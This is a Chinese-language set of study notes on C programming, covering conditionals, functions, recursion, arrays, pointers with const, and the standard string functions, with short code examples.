<h1 id="真值"><a href="#真值" class="headerlink" title="真值"></a>真值</h1><p>从数值方面而不是从真/假方面来看测试条件。要牢记：关系表达式为真，求值得1；关系表达式为假，求值得0。因此，这些表达式实际上相当于数值。<br>例如，用<code>while(goats)</code>替换<code>while (goats !=0)</code>，因为表达式<code>goats != 0</code>和<code>goats</code>都只有在goats的值为0时才为0或假。<br>第1种形式（while (goats != 0)）对初学者而言可能比较清楚，但是第2种形式（while (goats)）才是C程序员最常用的。</p>
<h1 id="比较常量"><a href="#比较常量" class="headerlink" title="比较常量"></a>比较常量</h1><p>如果待比较的一个值是常量，可以把该常量放在左侧有助于编译器捕获错误：<br>5 = canoes   &lt;—— 语法错误<br>5 == canoes  &lt;—— 检查canoes的值是否为5<br>可以这样做是因为C语言不允许给常量赋值，编译器会把赋值运算符的这种用法作为语法错误标记出来。许多经验丰富的程序员在构建比较是否相等的表达式时，都习惯把常量放在左侧。</p>
<h1 id="比较算数运算符优先级"><a href="#比较算数运算符优先级" class="headerlink" title="比较算数运算符优先级"></a>比较算数运算符优先级</h1><p><img src="/image/比较算数运算符优先级.png" alt="比较算数运算符优先级"></p>
<h1 id="ctype-h-头文件中的字符测试函数"><a href="#ctype-h-头文件中的字符测试函数" class="headerlink" title="ctype.h 头文件中的字符测试函数"></a>ctype.h 头文件中的字符测试函数</h1><p><img src="/image/ctype.头文件中的字符测试函数.png" alt=" ctype.h头文件中的字符测试函数"><br><img src="/image/ctype.h头文件中的字符映射函数.png" alt="ctype.h头文件中的字符映射函数"></p>
<h1 id="ctype-h"><a href="#ctype-h" class="headerlink" title="ctype.h"></a>ctype.h</h1><p><code>ctype.h</code>系列的字符函数（如，<code>issapce()</code>和<code>isalpha()</code>）为创建以分类字符为基础的测试表达式提供了便捷的工具。</p>
<h1 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符:  ?:"></a>条件运算符:  <code>?:</code></h1><p>expression1 ? expression2 : expression3</p>
<p>如果 expression1 为真（非 0），那么整个条件表达式的值与 expression2的值相同；如果expression1为假（0），那么整个条件表达式的值与expression3的值相同。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(5 &gt; 3) ? 1 : 2 值为1</span><br><span class="line">(3 &gt; 5) ? 1 : 2 值为2</span><br><span class="line">(a &gt; b) ? a : b 如果a &gt;b，则取较大的值</span><br></pre></td></tr></table></figure>
<h1 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h1><p>switch在圆括号中的测试表达式的值应该是一个整数值（包括char类型）。case标签必须是整数类型（包括char类型）的常量或整型常量表达式（即，表达式中只包含整型常量）。不能用变量作为case标签。<br>switch的构造如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">switch ( 整型表达式)</span><br><span class="line">&#123;</span><br><span class="line">case 常量1:</span><br><span class="line">语句 &lt;--可选</span><br><span class="line">case 常量2:</span><br><span class="line">语句 &lt;--可选</span><br><span class="line">default : &lt;--可选</span><br><span class="line">语句 &lt;--可选</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="输入流"><a href="#输入流" class="headerlink" title="输入流"></a>输入流</h1><p>考虑下面的输入：<br><code>is 28 12.4</code><br>在我们眼中，这就像是一个由字符、整数和浮点数组成的字符串。但是对 C程序而言，这是一个字节流。第1个字节是字母i的字符编码，第2个字节是字母s的字符编码，第3个字节是空格字符的字符编码，第4个字节是数字2的字符编码，等等。所以，如果get_long()函数处理这一行输入，第1个字符是非数字，那么整行输入都会被丢弃，包括其中的数字，因为这些数字只是该输入行中的其他字符：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while ((ch = getchar()) != &#x27;\n&#x27;)</span><br><span class="line">putchar(ch); // 处理错误的输入</span><br></pre></td></tr></table></figure><br>虽然输入流由字符组成，但是也可以设置scanf()函数把它们转换成数值。例如，考虑下面的输入：<br><code>42</code><br>如果在scanf()函数中使用%c转换说明，它只会读取字符4并将其储存在char类型的变量中。如果使用%s转换说明，它会读取字符4和字符2这两个字符，并将其储存在字符数组中。如果使用%d转换说明，scanf()同样会读取两个字符，但是随后会计算出它们对应的整数值：4×10+2，即42，然后将表示该整数的二进制数储存在 int 类型的变量中。如果使用%f 转换说明，scanf()也会读取两个字符，计算出它们对应的数值42.0，用内部的浮点表示法表示该值，并将结果储存在float类型的变量中。</p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="1-1-ANSI-C要求在每个变量前都声明其类型"><a href="#1-1-ANSI-C要求在每个变量前都声明其类型" class="headerlink" title="1.1 ANSI C要求在每个变量前都声明其类型"></a>1.1 ANSI C要求在每个变量前都声明其类型</h2><p>不能像普通变量声明那样使用同一类型的变量列表：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void dibs(int x, y, z) /* 无效的函数头 */</span><br><span class="line">void dubs(int x, int y, int z) /* 有效的函数头 */</span><br></pre></td></tr></table></figure><br>如果变量是同一类型，这种形式可以用逗号分隔变量名列表，如下所示：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void dibs(x, y, z)</span><br><span class="line">int x, y, z; /* 有效 */</span><br></pre></td></tr></table></figure></p>
<h2 id="1-2-使用函数前先声明"><a href="#1-2-使用函数前先声明" class="headerlink" title="1.2 使用函数前先声明"></a>1.2 使用函数前先声明</h2><p>在使用函数之前，要用ANSI C形式声明函数原型：<br><code>void show_n_char(char ch, int num);</code><br>当函数接受参数时，函数原型用逗号分隔的列表指明参数的数量和类型。根据个人喜好，你也可以省略变量名：<br><code>void show_n_char(char, int);</code><br>在原型中使用变量名并没有实际创建变量，char仅代表了一个char类型的变量，以此类推。</p>
<h2 id="1-3-省略函数原型却保留函数原型的优点"><a href="#1-3-省略函数原型却保留函数原型的优点" class="headerlink" title="1.3 省略函数原型却保留函数原型的优点"></a>1.3 省略函数原型却保留函数原型的优点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 下面这行代码既是函数定义，也是函数原型</span><br><span class="line">int imax(int a, int b) &#123; return a &gt; b ? a : b; &#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int x, z;</span><br><span class="line">...</span><br><span class="line">z = imax(x, 50);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>递归的关键在于每个递归调用都会等待它的下一级递归完成，然后再继续执行后面的代码，最终实现整个递归的效果。</p>
<p>可以假设有一条函数调用链——fun1()调用fun2()、fun2()调用 fun3()、fun3()调用fun4()。当 fun4()结束时，控制传回<br>fun3()；当fun3()结束时，控制传回 fun2()；当fun2()结束时，控制传回fun1()。递归的情况与此类似，只不过fun1()、fun2()、fun3()和fun4()都是相同的函数。</p>
<h2 id="递归的基本原理"><a href="#递归的基本原理" class="headerlink" title="递归的基本原理"></a>递归的基本原理</h2><ol>
<li>每级函数调用都有自己的变量。也就是说，第1级的n和第2级的n不同，所以程序创建了4个单独的变量，每个变量名都是n，但是它们的值各<br>不相同。当程序最终返回 up_and_down()的第1 级调用时，最初的n仍然是它的初值1。<br><img src="/image/递归中的变量.png" alt="递归中的变量"></li>
<li>每次函数调用都会返回一次。当函数执行完毕后，控制权将被传回上一级递归。程序必须按顺序逐级返回递归，从某级up_and_down()返回<br>上一级的up_and_down()，不能跳级回到main()中的第1级调用。</li>
<li>递归函数中位于递归调用之前的语句，均按被调函数的顺序执行。例如，程序清单9.6中的打印语句#1位于递归调用之前，它按照递归的<br>顺序：第1级、第2级、第3级和第4级，被执行了4次。</li>
<li>递归函数中位于递归调用之后的语句，均按被调函数相反的顺序执行。例如，打印语句#2位于递归调用之后，其执行的顺序是第4级、第3<br>级、第2级、第1级。递归调用的这种特性在解决涉及相反顺序的编程问题时很有用。稍后将介绍一个这样的例子。</li>
<li>虽然每级递归都有自己的变量，但是并没有拷贝函数的代码。程序按顺序执行函数中的代码，而递归调用就相当于又从头开始执行函数的代<br>码。除了为每次递归调用创建变量外，递归调用非常类似于一个循环语句。实际上，递归有时可用循环来代替，循环有时也能用递归来代替。</li>
<li>递归函数必须包含能让递归调用停止的语句。通常，递归函数都使用if或其他等价的测试条件在函数形参等于某特定值时终止递归。为此，<br>每次递归调用的形参都要使用不同的值。例如，程序中的up_and_down(n)调用up_and_down(n+1)。最终，实际参数等于4时，if的测试<br>条件(n &lt; 4)为假。</li>
</ol>
<h1 id="return"><a href="#return" class="headerlink" title="return"></a>return</h1><p>返回值不仅可以赋给变量，也可以被用作表达式的一部分。<br>返回值不一定是变量的值，也可以是任意表达式的值。<br><code>return (n &lt; m) ? n : m;</code></p>
<p><code>void variables(double *, double *, double *);</code></p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>如果初始化数组时省略方括号中的数字，编译器会根据初始化列表中的项数来确定数组的大小。</p>
<p>整个数组的大小除以单个元素的大小就是数组元素的个数。</p>
<p>for (index = 0; index &lt; sizeof days / sizeof days[0]; index++)<br>sizeof days是整个数组的大小（以字节为单位），sizeof day[0]是数组中一个元素的大小（以字节为单位）。</p>
<p>只有在函数原型或函数定义头中，才可以用<code>int ar[]</code>代替<code>int * ar</code></p>
<p>由于函数原型可以省略参数名，所以下面4种原型都是等价的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int sum(int *ar, int n);</span><br><span class="line">int sum(int *, int);</span><br><span class="line">int sum(int ar[], int n);</span><br><span class="line">int sum(int [], int);</span><br></pre></td></tr></table></figure><br>但是，在函数定义中不能省略参数名。下面两种形式的函数定义等价：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int sum(int *ar, int n)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sum(int ar[], int n)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果函数的意图不是修改数组中的数据内容，那么在函数原型和函数定义中声明形式参数时应使用关键字<code>const</code>。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int sum(const int ar[], int n); /* 函数原型 */</span><br><span class="line">int sum(const int ar[], int n) /* 函数定义 */</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int total = 0;</span><br><span class="line">for( i = 0; i &lt; n; i++)</span><br><span class="line">total += ar[i];</span><br><span class="line">return total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一般而言，如果编写的函数需要修改数组，在声明数组形参时则不使用const；如果编写的函数不用修改数组，那么在声明数组形参时最好使用const。</p>
<p><strong>复合字面量</strong></p>
<p>普通的数组声明：<code>int diva[2] = &#123;10, 20&#125;;</code><br>下面的复合字面量创建了一个和diva数组相同的匿名数组，也有两个int类型的值：<br><code>(int [2])&#123;10, 20&#125; // 复合字面量</code></p>
<ul>
<li>去掉声明中的数组名，留下的int [2]即是复合字面量的类型名<br><code>(int [])&#123;50, 20, 90&#125; // 内含3个元素的复合字面量</code><br>因为复合字面量是匿名的，所以不能先创建然后再使用它，必须在创建的同时使用它。<br>还可以把复合字面量作为实际参数传递给带有匹配形式参数的函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int sum(const int ar[], int n);</span><br><span class="line">...</span><br><span class="line">int total3;</span><br><span class="line">total3 = sum((int [])&#123;4,4,4,5,5,5&#125;, 6);</span><br></pre></td></tr></table></figure>
第1个实参是内含6个int类型值的数组，和数组名类似，这同时也是该数组首元素的地址。这种用法的好处是，把信息传入函数前不必先创建<br>数组，这是复合字面量的典型用法。</li>
</ul>
<p>可以把这种用法应用于二维数组或多维数组。例如，下面的代码演示了如何创建二维int数组并储存其地址：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int (*pt2)[4]; // 声明一个指向二维数组的指针，该数组内含2个数组元素，</span><br><span class="line">// 每个元素是内含4个int类型值的数组</span><br><span class="line">pt2 = (int [2][4]) &#123; &#123;1,2,3,-9&#125;, &#123;4,5,6,-8&#125; &#125;;</span><br></pre></td></tr></table></figure><br>如上所示，该复合字面量的类型是<code>int [2][4]</code>，即一个2×4的int数组。</p>
<p><strong>变长数组</strong></p>
<p>C99引入了变长数组（Variable-Length Arrays，VLA），允许使用变量表示数组的维度。以下是一个使用变长数组的例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int quarters = 4;</span><br><span class="line">int regions = 5;</span><br><span class="line">double sales[regions][quarters]; // 变长数组（VLA）</span><br></pre></td></tr></table></figure><br>变长数组的限制和特点：</p>
<ol>
<li><p>存储类别限制： 变长数组必须是自动存储类别，不能使用static或extern存储类别说明符。</p>
</li>
<li><p>初始化限制： 不能在声明中初始化变长数组。</p>
</li>
<li><p>可选特性： C11标准将变长数组作为可选特性，而不是必须强制实现的特性。</p>
</li>
<li><p>不能改变大小： 变长数组的”变”指的是在创建数组时可以使用变量指定数组的维度，而不是可以修改已创建数组的大小。一旦创建，数组的大小保持不变。</p>
</li>
</ol>
<p>计算二维数组元素之和的示例：<br>考虑一个函数 sum2d，计算int类型的二维数组所有元素之和。以下是该函数的声明和定义：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int sum2d(int rows, int cols, int ar[rows][cols]); // ar是一个变长数组（VLA）</span><br><span class="line"></span><br><span class="line">int sum2d(int rows, int cols, int ar[rows][cols])</span><br><span class="line">&#123;</span><br><span class="line">    int r;</span><br><span class="line">    int c;</span><br><span class="line">    int tot = 0;</span><br><span class="line"></span><br><span class="line">    for (r = 0; r &lt; rows; r++)</span><br><span class="line">        for (c = 0; c &lt; cols; c++)</span><br><span class="line">            tot += ar[r][c];</span><br><span class="line"></span><br><span class="line">    return tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>函数原型中，<code>ar</code> 是一个二维变长数组，使用了 <code>rows</code> 和 <code>cols</code> 作为两个维度。</li>
<li>函数定义中，使用了 <code>rows</code> 和 <code>cols</code> 来表示二维数组的大小，可以处理任意大小的二维int数组。<br><strong>注意：</strong> 形参列表中必须在声明 <code>ar</code> 之前先声明 <code>rows</code> 和 <code>cols</code>。</li>
</ul>
<p>此外，函数的定义也可以使用省略形参名的方式：<br><code>int sum2d(int, int, int ar[*][*]); // ar是一个变长数组（VLA），省略了维度形参名</code></p>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p><strong>声明指针</strong></p>
<p>声明指针时需要需要带有变量，如果不想加变量则需要有<code>*</code></p>
<p>不要混淆 <code>*(dates+2)</code> 和<code>*dates+2</code> 。间接运算符（<em>）的优先级高于+，所以 `</em>dates+2` 相当于(*dates)+2：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(dates + 2) // dates第3个元素的值</span><br><span class="line"></span><br><span class="line">*dates + 2 // dates第1个元素的值加2</span><br></pre></td></tr></table></figure></p>
<p>一元运算符<code>*</code>和<code>++</code>的优先级相同，但结合律是从右往左，所以<code>start++</code>先求值，然后才是<code>*start</code>。也就是说，指针start先递增后指向。使用后缀形式（即<code>start++</code>而不是<code>++start</code>）如果使用<code>*++start</code>，顺序则反过来，先递增指针，再使用指针指向位置上的值。如果使<code>(*start)++</code>，则先使用start指向的值，再递增该值，而不是递增指针。这样，指针将一直指向同一个位置，但是该位置上的值发生了变化。虽然<code>*start++</code>的写法比较常用，但是<code>*(start++)</code>这样写更清楚。</p>
<p><strong>当涉及到 <code>const</code> 修饰符和指针时，有几个要点需要注意：</strong></p>
<ul>
<li><code>const</code>修饰指针所指向的数据，表示指针所指向的数据不能通过这个指针进行修改。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const double *pd = rates; // pd指向数组的首元素</span><br><span class="line">*pd = 29.89; // 不允许修改</span><br><span class="line">pd[2] = 222.22; // 不允许修改</span><br><span class="line">rates[0] = 99.99; // 允许修改，因为rates未被const限定</span><br></pre></td></tr></table></figure></li>
<li>指向 <code>const</code> 的指针 (<code>const double *pc</code>) 可以指向非 <code>const</code> 的数据，但不能通过这个指针修改所指向的数据：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">double rates[5] = &#123;88.99, 100.12, 59.45, 183.11, 340.5&#125;;</span><br><span class="line">const double *pc = rates; // 有效</span><br><span class="line">pc = &amp;rates[3]; // 有效</span><br><span class="line">*pc = 92.99; // 不允许修改</span><br></pre></td></tr></table></figure></li>
<li>指向非 <code>const</code> 的指针（<code>double *pnc</code>）可以指向 <code>const</code> 数据，但也不能通过这个指针修改所指向的 const 数据：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">double rates[5] = &#123;88.99, 100.12, 59.45, 183.11, 340.5&#125;;</span><br><span class="line">const double locked[4] = &#123;0.08, 0.075, 0.0725, 0.07&#125;;</span><br><span class="line">double *pnc = rates; // 有效</span><br><span class="line">pnc = &amp;rates[3]; // 有效</span><br><span class="line">pnc = locked; // 不允许</span><br></pre></td></tr></table></figure></li>
<li><code>const</code> 可以用于指向数组的指针，保护数组数据不被修改：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">double rates[5] = &#123;88.99, 100.12, 59.45, 183.11, 340.5&#125;;</span><br><span class="line">const double *pc = rates; // 指向数组的首元素</span><br><span class="line">show_array(rates, 5); // 有效，数组名转换成指向 const 的指针</span><br><span class="line">show_array(locked, 4); // 有效，数组名转换成指向 const 的指针</span><br></pre></td></tr></table></figure></li>
<li><code>const</code> 还可以用于创建常量指针，该指针一旦指向一个地址，就不能再指向别处：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">double rates[5] = &#123;88.99, 100.12, 59.45, 183.11, 340.5&#125;;</span><br><span class="line">double * const pc = rates; // pc指向数组的开始</span><br><span class="line">pc = &amp;rates[2]; // 不允许，因为该指针不能指向别处</span><br><span class="line">*pc = 92.99; // 允许修改 rates[0] 的值</span><br></pre></td></tr></table></figure></li>
<li><code>const</code> 也可以用于创建既不能更改所指向地址，也不能修改指向地址上的值的指针：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">double rates[5] = &#123;88.99, 100.12, 59.45, 183.11, 340.5&#125;;</span><br><span class="line">const double * const pc = rates; // 不能修改指向的地址，也不能修改地址上的值</span><br><span class="line">pc = &amp;rates[2]; // 不允许</span><br><span class="line">*pc = 92.99; // 不允许</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>演示程序<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* order.c -- 指针运算中的优先级 */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int data[2] = &#123; 100, 200 &#125;;</span><br><span class="line">int moredata[2] = &#123; 300, 400 &#125;;</span><br><span class="line">int main() &#123;</span><br><span class="line">    int * p1, *p2, *p3;</span><br><span class="line">    p1 = p2 = data;</span><br><span class="line">    p3 = moredata;</span><br><span class="line">    printf(&quot;*p1 = %d, *p2 = %d, *p3 = %d\n&quot;, *p1, *p2, *p3);</span><br><span class="line">    printf(&quot;*p1++=%d, *++p2=%d, (*p3)++=%d\n&quot;, *p1++, *++p2, (*p3)++);</span><br><span class="line">    printf(&quot;*p1 = %d, *p2 = %d, *p3 = %d\n&quot;, *p1, *p2, *p3);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>该程序输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*p1 = 100, *p2 = 100, *p3 = 300</span><br><span class="line">*p1++=100, *++p2=200, (*p3)++=300</span><br><span class="line">*p1 = 200, *p2 = 200, *p3 = 301</span><br></pre></td></tr></table></figure>
只有(*p3)++改变了数组元素的值，其他两个操作分别把p1和p2指向数组的下一个元素。</li>
</ul>
<h2 id="字符串声明比较"><a href="#字符串声明比较" class="headerlink" title="字符串声明比较"></a>字符串声明比较</h2><p>两种声明几乎相同：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const char *pt1 = &quot;Something is pointing at me;&quot;;</span><br><span class="line">const char ar1[] = &quot;Something is pointing at me;&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="数组形式（ar1-）"><a href="#数组形式（ar1-）" class="headerlink" title="数组形式（ar1[]）"></a>数组形式（ar1[]）</h3><ul>
<li>在内存中分配一个内含29个元素的数组，每个元素对应一个字符，还有一个末尾的空字符’\0’。</li>
<li>字符串作为可执行文件的一部分储存在数据段中，静态存储区。</li>
<li>程序开始运行时为数组分配内存，将字符串拷贝到数组中，此时有两个副本：一个在静态内存中，一个在数组中。</li>
<li>数组名ar1是该数组首元素地址的别名，是地址常量，不能更改。可以进行<code>ar1+1</code>等操作，但不允许进行<code>++ar1</code>这样的操作。</li>
</ul>
<h3 id="指针形式（-pt1）"><a href="#指针形式（-pt1）" class="headerlink" title="指针形式（*pt1）"></a>指针形式（*pt1）</h3><ul>
<li>编译器为字符串在静态存储区预留29个元素的空间，并为指针变量pt1留出一个储存位置，将字符串的地址储存在指针变量中。</li>
<li>指针形式只拷贝字符串的地址给指针，不会拷贝字符串本身。指针可以改变指向的位置，可以使用递增运算符。</li>
<li>字符串字面量被视为const数据，因此指针pt1需要声明为指向const数据的指针，不能通过pt1改变所指向的数据。</li>
</ul>
<p><strong>总结：初始化数组把静态存储区的字符串拷贝到数组中，而初始化指针只把字符串的地址拷贝给指针。</strong></p>
<h3 id="空字符与空指针的区别"><a href="#空字符与空指针的区别" class="headerlink" title="空字符与空指针的区别"></a>空字符与空指针的区别</h3><ul>
<li><p><strong>空字符 (‘\0’)：</strong></p>
<ul>
<li>用于标记C字符串的末尾。</li>
<li>对应字符编码是0。</li>
<li>在字符串中不可能是其他字符的一部分。</li>
<li>是整数类型，占1字节。</li>
</ul>
</li>
<li><p><strong>空指针 (NULL)：</strong></p>
<ul>
<li>有一个值，该值不会与任何数据的有效地址对应。</li>
<li>通常用于表示特殊情况，例如遇到文件结尾或未能按预期执行。</li>
<li>是指针类型，占4字节（通常）。</li>
</ul>
</li>
</ul>
<p><strong>注意：</strong><br>虽然它们可以用数值0来表示，但从概念上看，空字符和空指针是不同类型的0。</p>
<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><ul>
<li><strong>请注意，那些使用const关键字的函数原型表明，函数不会更改字符串。</strong></li>
</ul>
<p><code>char *strcpy(char * restrict s1, const char * restrict s2);</code><br>该函数把s2指向的字符串（包括空字符）拷贝至s1指向的位置，返回值是s1。</p>
<p><code>char *strncpy(char * restrict s1, const char * restrict s2, size_t n);</code><br>该函数把s2指向的字符串拷贝至s1指向的位置，拷贝的字符数不超过n，其返回值是s1。该函数不会拷贝空字符后面的字符，如果源字符串的字符少于n个，目标字符串就以拷贝的空字符结尾；如果源字符串有n个或超过n个字符，就不拷贝空字符。</p>
<p><code>char *strcat(char * restrict s1, const char * restrict s2);</code><br>该函数把s2指向的字符串拷贝至s1指向的字符串末尾。s2字符串的第1个字符将覆盖s1字符串末尾的空字符。该函数返回s1。</p>
<p><code>char *strncat(char * restrict s1, const char * restrict s2, size_t n);</code><br>该函数把s2字符串中的n个字符拷贝至s1字符串末尾。s2字符串的第1个字符将覆盖s1字符串末尾的空字符。不会拷贝s2字符串中空字符和其后的字符，并在拷贝字符的末尾添加一个空字符。该函数返回s1。</p>
<p><code>int strcmp(const char * s1, const char * s2);</code><br>如果s1字符串在机器排序序列中位于s2字符串的后面，该函数返回一个正数；如果两个字符串相等，则返回0；如果s1字符串在机器排序序列中位于s2字符串的前面，则返回一个负数。</p>
<p><code>int strncmp(const char * s1, const char * s2, size_t n);</code><br>该函数的作用和strcmp()类似，不同的是，该函数在比较n个字符后或遇到第1个空字符时停止比较。</p>
<p><code>char *strchr(const char * s, int c);</code><br>如果s字符串中包含c字符，该函数返回指向s字符串首位置的指针（末尾的空字符也是字符串的一部分，所以在查找范围内）；如果在字符串s中未找到c字符，该函数则返回空指针。</p>
<p><code>char *strpbrk(const char * s1, const char * s2);</code><br>如果 s1 字符中包含 s2 字符串中的任意字符，该函数返回指向 s1 字符串首位置的指针；如果在s1字符串中未找到任何s2字符串中的字符，则返回空字符。</p>
<p><code>char *strrchr(const char * s, int c);</code><br>该函数返回s字符串中c字符的最后一次出现的位置（末尾的空字符也是字符串的一部分，所以在查找范围内）。如果未找到c字符，则返回空指针。</p>
<p><code>char *strstr(const char * s1, const char * s2);</code><br>该函数返回指向s1字符串中s2字符串出现的首位置。如果在s1中没有找到s2，则返回空指针。</p>
<p><code>size_t strlen(const char * s);</code><br>该函数返回s字符串中的字符数，不包括末尾的空字符。</p>
<h2 id="s-gets"><a href="#s-gets" class="headerlink" title="s_gets()"></a>s_gets()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char * s_get(char * st, int n)</span><br><span class="line">&#123;</span><br><span class="line">char * ret_val;</span><br><span class="line">ret_val = fgets(st, n, stdin);</span><br><span class="line">if (ret_val)</span><br><span class="line">&#123;</span><br><span class="line">while (*st != &#x27;\n&#x27; &amp;&amp; *st != &#x27;\0&#x27;)</span><br><span class="line">st++;</span><br><span class="line">if (*st == &#x27;\n&#x27;)</span><br><span class="line">*st = &#x27;\0&#x27;;</span><br><span class="line">else</span><br><span class="line">while (getchar() != &#x27;\n&#x27;)</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">return ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
